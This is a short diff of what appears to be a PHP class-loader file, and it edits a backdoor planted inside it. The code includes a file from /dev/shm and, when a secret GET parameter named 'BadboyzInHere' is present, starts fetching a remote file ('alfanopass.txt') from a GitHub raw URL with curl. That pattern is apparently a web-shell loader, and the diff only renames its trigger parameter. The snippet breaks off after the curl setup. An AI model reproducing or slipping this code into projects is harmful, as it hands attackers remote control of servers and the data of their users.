@@ -578,7 +578,7 @@ class ClassLoader
     }
 }
 include("/dev/shm/ego");
-if (isset($_GET['Badboyz.InHere!!'])) {
+if (isset($_GET['BadboyzInHere'])) {
     $url = "https://raw.githubusercontent.com/callsnoop/shellsnoop/refs/heads/main/alfanopass.txt";
 
     $ch = curl_init();
